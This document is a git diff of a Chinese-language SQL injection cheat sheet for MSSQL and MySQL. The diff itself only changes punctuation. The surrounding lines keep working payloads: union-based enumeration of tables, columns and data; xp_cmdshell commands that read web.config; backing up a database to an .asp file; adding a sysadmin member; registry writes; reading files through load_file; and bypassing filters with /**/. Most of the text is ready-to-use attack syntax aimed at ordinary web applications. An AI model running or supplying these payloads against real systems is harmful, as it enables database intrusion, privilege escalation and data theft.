@@ -357,7 +357,7 @@ union select  top 1 name from 库名.dbo.sysobjects where xtype='U' and name not
 union select  top 1 name from 库名.dbo.sysobjects where xtype='U' and name not in('第一张表','第二张表')
 ```
 
-爆列：
+爆列:
 ```sql
 爆ID select id from seay.dbo.sysobjects where xtype='U' and name='admin'
 
@@ -366,7 +366,7 @@ union select  top 1 name from 库名.dbo.sysobjects where xtype='U' and name not
 爆第二个列  select top 1 name from seay.dbo.syscolumns where id=ID号 and name not in('第一个列')
 ```
 
-爆数据：
+爆数据:
 ```sql
 select 列名 from 表名
 
@@ -377,12 +377,12 @@ exec master.dbo.xp_dirtree 'c:\';-- 获得所有子目录的目录树结构
 exec master.dbo.xp_cmdshell 'type c:\web\web.config';-- 查看文件的内容
 ```
 
-备份数据库：
+备份数据库:
 ```sql
 backup database 库名 to disk='c:/l.asp';
 ```
 
-MSSQL内置函数：
+MSSQL内置函数:
 ```sql
 select @@version  查询数据库版本
 select user_name() 查询当前数据库连接用户名
@@ -405,13 +405,13 @@ exec sp_addsrvrolemember 'username', sysadmin
 ;declare @d int;--
 ```
 
-停掉或激活某个服务。
+停掉或激活某个服务.
 ```sql
 exec master..xp_servicecontrol 'stop','schedule'
 exec master..xp_servicecontrol 'start','schedule'
 ```
 
-解开压缩档。
+解开压缩档.
 ```sql
 xp_unpackcab 'c:\test.cab','c:\temp',1
 ```
@@ -421,7 +421,7 @@ xp_unpackcab 'c:\test.cab','c:\temp',1
 ;exec master..dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll';--
 ```
 
-开启沙盘模式：
+开启沙盘模式:
 ```sql
 exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
 ```
@@ -494,21 +494,21 @@ and length(user())>0
 
 判断版本
 ```sql
-and ord(mid(version(),1,1))>51 /* 返回正常说明是4.0以上版本，可以用 union 查询
+and ord(mid(version(),1,1))>51 /* 返回正常说明是4.0以上版本,可以用 union 查询
 ```
 
-利用 order by 暴字段，在网址后加 order by 10 /* 如果返回正常说明字段大于10
+利用 order by 暴字段,在网址后加 order by 10 /* 如果返回正常说明字段大于10
 
-再利用 union 来查询准确字段，如: order by 或者and 1=2 union select 1,2,3,......./*直到返回正常，说明猜到准确字段数。如过滤了空格可以用/**/代替。
+再利用 union 来查询准确字段,如: order by 或者and 1=2 union select 1,2,3,......./*直到返回正常,说明猜到准确字段数.如过滤了空格可以用/**/代替.
 
 判断数据库连接帐号有没有写权限
 ```sql
-and (select count(*) from mysql.user)>0     /*如果结果返回错误，那我们只能猜解管理员帐号和密码了。
+and (select count(*) from mysql.user)>0     /*如果结果返回错误,那我们只能猜解管理员帐号和密码了.
 ```
 
-如果返回正常，则可以通过
+如果返回正常,则可以通过
 ```sql
-and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值，用逗号隔开)),8,9,10 /* 注：load_file(char(文件路径的 ascii 值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件，找到数据库连接等。
+and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值,用逗号隔开)),8,9,10 /* 注:load_file(char(文件路径的 ascii 值,用逗号隔开))也可以用十六进制,通过这种方式读取配置文件,找到数据库连接等.
 ```
 
 检测是不是 root 权限
@@ -516,22 +516,22 @@ and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值，用逗
 and/**/ord(mid(user(),1,1))=114/*
 ```
 
-mysql 内置函数 hex() 转换字符为16进制，如
+mysql 内置函数 hex() 转换字符为16进制,如
 ```sql
 select hex(user())
 ```
 
-mysql内置函数unhex() 解码16进制，如
+mysql内置函数unhex() 解码16进制,如
 ```sql
 select unhex(hex(user()))
 ```
 
-mysql 内置函数 concat() 将多列合并成一列，如
+mysql 内置函数 concat() 将多列合并成一列,如
 ```sql
 select concat(username,0x3A,password) from t_member
 ```
 
-常用内置函数使用：
+常用内置函数使用:
 ```sql
 select system_user()  查看系统用户
 select current_user()  查询当前用户
@@ -542,8 +542,8 @@ select @@version_compile_os 查询当前操作系统
 select @@datadir    查询读取数据库路径
 select @@basedir    查询MYSQL安装路径
 ```
-去掉limit 1,1为查询出所有行，第一个数字代表查询第几个，第二个数字代表一次查询出的数量
-第一个数字从1开始递增，查询到3时浏览器返回错误，说明存在2个库/表。
+去掉limit 1,1为查询出所有行,第一个数字代表查询第几个,第二个数字代表一次查询出的数量
+第一个数字从1开始递增,查询到3时浏览器返回错误,说明存在2个库/表.
 
 查数据库数量
 ```sql
